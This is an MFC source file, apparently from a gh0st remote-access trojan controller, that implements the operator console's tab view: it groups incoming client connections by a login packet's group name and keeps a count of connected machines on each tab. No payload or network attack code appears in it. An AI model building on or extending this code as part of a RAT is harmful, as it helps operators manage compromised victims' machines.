// gh0stView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "gh0stView.h"

#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDC_TABCONTROL 100

CGh0stView* g_pTabView;
extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CView)

BEGIN_MESSAGE_MAP(CGh0stView, CView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_SIZE()
	ON_WM_CREATE()
	ON_WM_ERASEBKGND()
	//}}AFX_MSG_MAP
	ON_NOTIFY(TCN_SELCHANGE, IDC_TABCONTROL, OnSelectedChanged)
	ON_WM_MOUSEACTIVATE()
	ON_MESSAGE(WM_ADDFINDGROUP, OnAddFindGroup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	g_pTabView = this;
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= WS_CLIPCHILDREN;
	return CView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers
BOOL CGh0stView::AddView(CRuntimeClass* pViewClass, LPCTSTR lpszTitle)
{
	CCreateContext contextT;
	contextT.m_pCurrentDoc     = GetDocument();
	contextT.m_pNewViewClass   = pViewClass;
	contextT.m_pNewDocTemplate = GetDocument()->GetDocTemplate();
	
	CWnd* pWnd;
	TRY
	{
		pWnd = (CWnd*)pViewClass->CreateObject();
		if (pWnd == NULL)
		{
			AfxThrowMemoryException();
		}
	}
	CATCH_ALL(e)
	{
		TRACE0( "Out of memory creating a view.\n" );
		// Note: DELETE_EXCEPTION(e) not required
		return FALSE;
	}
	END_CATCH_ALL
		
		DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
	dwStyle &= ~WS_BORDER;
	
	int nTab = m_wndTabControl.GetItemCount();
	
	// Create with the right size (wrong position)
	CRect rect(0,0,0,0);
	if (!pWnd->Create(NULL, NULL, dwStyle,
		rect, &m_wndTabControl, (AFX_IDW_PANE_FIRST + nTab), &contextT))
	{
		TRACE0( "Warning: couldn't create client tab for view.\n" );
		// pWnd will be cleaned up by PostNcDestroy
		return NULL;
	}
	m_wndTabControl.InsertItem(nTab, lpszTitle, pWnd->GetSafeHwnd());
	
	pWnd->SetOwner(this);
	
	return TRUE;
	
}

LRESULT CGh0stView::OnAddFindGroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	try
	{	
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		BOOL bFind=false;
		CString strGroupName, strTemp;
		
		int nTabs = m_wndTabControl.GetItemCount();
		for ( int i = 0; i < nTabs; i++)
		{
			strTemp = m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if( n > 0 )
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if (strGroupName == LoginInfo->UpGroup)
			{	
				bFind = true;
				CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
				pView->m_iocpServer = g_pConnectView->m_iocpServer;
				pView->PostMessage( WM_ADDTOLIST, 0, (LPARAM)pContext );
				break;
			}
		}
		if (!bFind)
		{	
			strGroupName.Format( "%s(1)", LoginInfo->UpGroup );
			AddGroup( strGroupName );
			CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
			pView->NewInitialUpdate();
			pView->m_iocpServer = g_pConnectView->m_iocpServer;
			pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext );
		}
	}
	catch (...){}
	
	return 0;
}

void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);

	if (m_wndTabControl.GetSafeHwnd())
	{
		m_wndTabControl.MoveWindow(0, 0, cx, cy);
	}
}

void CGh0stView::UpdateDocTitle()
{
	GetDocument()->UpdateFrameCounts();
}

void CGh0stView::OnSelectedChanged(NMHDR* pNMHDR, LRESULT* pResult)
{
	UNUSED_ALWAYS(pNMHDR);
	*pResult = 0;
	
	UpdateDocTitle();
	
	CFrameWnd* pFrame = GetParentFrame();
	CView* pView = DYNAMIC_DOWNCAST(CView, CWnd::FromHandle(m_wndTabControl.GetSelectedItem()->GetHandle()));
	ASSERT_KINDOF(CView, pView);
	
	pFrame->SetActiveView(pView);
}
/*
int CGh0stView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	m_wndTabControl.Create(WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceExcel);
//	xtpTabAppearancePropertyPage,           // Gives your tabs an Office 2000 appearance.
//	xtpTabAppearancePropertyPageSelected,   // Gives your tabs an Office 2000 selected appearance.
//	xtpTabAppearancePropertyPageFlat,       // Gives your tabs an Office 2000 Flat appearance.
//	xtpTabAppearancePropertyPage2003,       // Gives your tabs an Office 2003 appearance.
//	xtpTabAppearanceStateButtons,           // Gives your tabs a State Button appearance.
//	xtpTabAppearanceVisualStudio,           // Gives your tabs a Visual Studio appearance.
//	xtpTabAppearanceFlat,                   // Gives your tabs Flat appearance.
//	xtpTabAppearanceExcel,                  // Gives your tabs an Excel appearance.
//	xtpTabAppearanceVisio,                  // Gives your tabs a Visio appearance.
//	xtpTabAppearanceVisualStudio2005,       // Gives your tabs a Visual Studio 2005 appearance.
//	xtpTabAppearancePropertyPage2007,       // Gives your tabs an Office 2007 appearance.
//	xtpTabAppearancePropertyPageAccess2007  // Gives your tabs an Office 2007 appearance.

	m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2010);	// 标签颜色
//	xtpTabColorDefault          = 0x0001, // Tabs will use the default color for the currently set Appearance.
//	xtpTabColorVisualStudio2003 = 0x0002, // Tabs will use the Visual Studio 2003 color style for the currently set Appearance.
//	xtpTabColorOffice2003       = 0x0004, // Tabs will use the Office 2003 color style for the currently set Appearance.
//	xtpTabColorWinNative        = 0x0008, // Tabs will use the Windows XP color style for the currently set Appearance.
//	xtpTabColorVisualStudio2005 = 0x0010, // Tabs will use the Visual Studio 2005 color style for the currently set Appearance.
//	xtpTabColorOffice2007       = 0x0020, // Tabs will use the Office 2007 color style for the currently set Appearance.
//	xtpTabColorVisualStudio2008 = 0x0040, // Tabs will use the Visual Studio 2008 color style for the currently set Appearance.
//	xtpTabColorOffice2007Access = 0x0080, // Tabs will use the Office 2007 Access color style for the currently set Appearance.
//	xtpTabColorVisualStudio2010 = 0x0100, // Tabs will use the Visual Studio 2010 color style for the currently set Appearance.
//	xtpTabColorOffice2010       = 0x0200, // Tabs will use the Office 2010 color style for the currently set Appearance.

	m_wndTabControl.GetPaintManager()->SetPosition(xtpTabPositionBottom); // 标签位置
	m_wndTabControl.GetPaintManager()->m_bHotTracking = TRUE;
//	m_wndTabControl.GetPaintManager()->DisableLunaColors(FALSE);

	AddGroup(_T("默认分组(0)")); // 标签名称
	m_wndTabControl.SetCurSel(0);

	return 0;
}
*/
int CGh0stView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	m_wndTabControl.Create(WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceExcel);
	m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorOffice2003);	//标签颜色
	m_wndTabControl.GetPaintManager()->m_bHotTracking = TRUE;
	m_wndTabControl.GetPaintManager()->SetPosition(xtpTabPositionBottom); //标签位置
	AddGroup(_T("默认分组(0)"));	//标签名称
	m_wndTabControl.SetCurSel(0);
	return 0;
}

int CGh0stView::OnMouseActivate(CWnd* pDesktopWnd, UINT nHitTest, UINT message)
{
	return CWnd::OnMouseActivate(pDesktopWnd, nHitTest, message);
}

BOOL CGh0stView::AddGroup( LPCTSTR lpszTitle )
{
	BOOL Result = AddView(RUNTIME_CLASS(CPcView), lpszTitle);
	return Result;
}

BOOL CGh0stView::OnEraseBkgnd(CDC* /*pDC*/) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
}

BOOL CGh0stView::UpDateNumber()
{	
	CString strGroupName, strTemp;
	int nTabs = m_wndTabControl.GetItemCount();
	
	for ( int i = 0; i < nTabs; i++ )
	{	
		strTemp = m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));

/*		//自动删除 多余分组
		if (pView->m_pListCtrl->GetItemCount() == 0 && strGroupName != "默认分组")
		{
			m_wndTabControl.DeleteItem(i);
			i--;
			nTabs--;
			continue;
		}
*/
		strTemp.Format( "%s(%d)", strGroupName, pView->m_pListCtrl->GetItemCount() );
		m_wndTabControl.GetItem(i)->SetCaption(strTemp);

	}
	return TRUE;
}
